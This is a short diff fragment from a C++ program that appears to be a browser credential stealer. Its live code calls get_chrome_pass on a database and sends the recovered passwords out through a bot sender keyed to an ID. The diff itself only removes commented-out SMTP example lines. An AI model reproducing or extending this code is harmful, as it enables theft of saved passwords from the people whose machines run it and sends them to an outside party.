@@ -77,10 +77,7 @@ int main()
             }
             pass = get_chrome_pass(db);
             bot_sender.send(ID, pass.str());
-
-            //SMTPClient email("yoursmtpserver.com", 25, "user@yourdomain.com", "password");
-            //email.Send("from@yourdomain.com","to@somewhere.com","subject","Hello from C++ SMTP Client!");
-
+            
             //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
         }
 
